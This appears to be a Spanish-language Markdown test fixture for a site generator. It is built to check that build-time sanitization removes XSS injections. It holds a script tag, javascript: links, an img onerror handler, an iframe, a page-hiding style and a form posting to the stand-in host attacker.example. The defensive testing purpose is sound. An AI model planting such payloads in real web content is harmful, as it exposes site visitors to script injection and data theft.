---
title: "Fixture de regresión XSS — no debe propagarse al HTML emitido"
interviewee:
  name: "Mallory"
  role: "Adversary"
  company: "Untrusted Inc"
date: "2026-04-21"
tags:
  - security
  - xss
summary: "Fixture que intenta inyectar scripts y handlers maliciosos para verificar la sanitización en build time."
published: true
---

## Intento 1 — script tag inline

<script>alert(1)</script>

## Intento 2 — javascript: URI en link Markdown

[click aquí](javascript:alert(1))

## Intento 3 — anchor con href javascript:

<a href="javascript:alert(1)">click</a>

## Intento 4 — img onerror

<img src="x" onerror="alert(1)">

## Intento 5 — html arbitrario

<iframe src="https://attacker.example/"></iframe>

<style>body { display: none; }</style>

<form action="https://attacker.example/" method="post"><input name="x"></form>
